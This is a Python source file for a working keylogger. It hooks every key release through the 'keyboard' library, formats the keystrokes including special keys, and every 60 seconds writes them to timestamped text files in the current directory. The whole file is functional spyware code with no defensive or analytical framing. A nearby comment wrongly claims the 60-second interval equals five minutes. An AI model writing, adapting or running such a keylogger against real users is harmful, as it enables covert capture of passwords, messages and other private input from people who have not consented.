import keyboard                 # for keylogs
from threading import Timer     
from datetime import datetime

SEND_REPORT_EVERY = 60;        # 60 * 5 = 300 => 5 minutes


class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval;
        # The logs contains the string that contains the log of all
        # the keystrokes within `self.interval`
        self.log = '';
        # record the start and end of this keylogger
        self.start_dt = datetime.now();
        self.report_method = report_method;
        self.filename = "";

    def callback(self, keyEvent):
        """
            This callback function is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
        """
        name = keyEvent.name;

        if (len(name) > 1):     # not a character, special key (e.g ctrl, alt, etc)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " ";
            
            elif name == "enter":
                # add new line whenever an ENTER is pressed
                name = "[ENTER]\n";

            elif name == "decimal":
                name = ".";

            else:
                # replace spaces with underscores
                name = name.replace(" ", "_");
                name = f"[{name.upper()}]";
        # finally add the key name to our global self.log variable
        self.log += name;

    
    def update_filename(self):
        self.filename = f"keylogs-{self.start_dt.strftime('%d-%m-%Y_%H-%M-%S')}";

    def report_to_file(self):
        """
            This method creates a log file in the current directory that contains the
            current keylogs in the self.log variable
        """
        with open(f"{self.filename}.txt", "w") as f:
            # write keylogs to the file
            print(self.log, file=f);

    def report(self):
        """
            This function gets called every `self.interval`
            It basically sends keylogs and resets self.log variable.
        """

        if self.log:
            self.update_filename();
            # report to the file
            self.report_to_file();
            # update the datetime, so you can create a new file with a new name
            self.start_dt = datetime.now();
        
        # reset the logs
        self.log = "";
        timer = Timer(interval=self.interval, function=self.report);
        # set the thread as daemon(dies when main thread die)

        timer.daemon = True;
        # start the timer
        timer.start();

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback);
        # start reporting the keylogs
        self.report();

        print(f"{datetime.now()} - Keylogger started");
        # block the current thread, wait until CTRL-c is pressed
        keyboard.wait();

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY);
    keylogger.start();







